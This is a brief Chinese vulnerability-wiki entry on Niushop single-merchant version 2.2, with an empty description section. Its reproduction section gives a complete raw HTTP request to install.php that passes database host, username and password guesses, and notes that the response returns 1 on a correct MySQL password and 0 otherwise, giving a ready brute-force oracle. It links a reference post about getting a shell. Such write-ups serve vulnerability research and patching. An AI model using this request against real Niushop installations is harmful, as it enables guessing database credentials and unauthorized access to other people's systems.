Niushop 单商户 2.2 爆破MySQL密码
================================

一、漏洞简介
------------

二、漏洞影响
------------

Version：单商户 2.2

三、复现过程
------------

### 安装爆破MySQL密码

    GET /niushop/install.php?action=true&dbserver=127.0.0.1&dbpassword=root2&dbusername=root&dbname=niushop_b2c HTTP/1.1
    Host: 127.0.0.1
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
    Referer: http://127.0.0.1/niushop/install.php?refresh
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: action=db
    Connection: close

![](/Users/aresx/Documents/VulWiki/.resource/Niushop单商户2.2爆破MySQL密码/media/rId25.jpg)

爆破成功返回1，密码错误返回0

参考链接
--------

> https://y4er.com/post/niushop-getshell/
